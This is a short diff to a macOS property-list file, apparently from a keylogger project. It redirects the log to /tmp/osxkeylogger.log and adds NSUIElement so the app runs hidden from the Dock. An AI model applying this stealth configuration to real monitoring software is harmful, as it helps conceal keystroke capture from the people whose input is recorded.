@@ -3,7 +3,9 @@
 <plist version="1.0">
 <dict>
 	<key>logFile</key>
-	<string>stdout</string>
+	<string>/tmp/osxkeylogger.log</string>
+	<key>NSUIElement</key>
+	<string>1</string>
 	<key>CFBundleDevelopmentRegion</key>
 	<string>English</string>
 	<key>CFBundleExecutable</key>
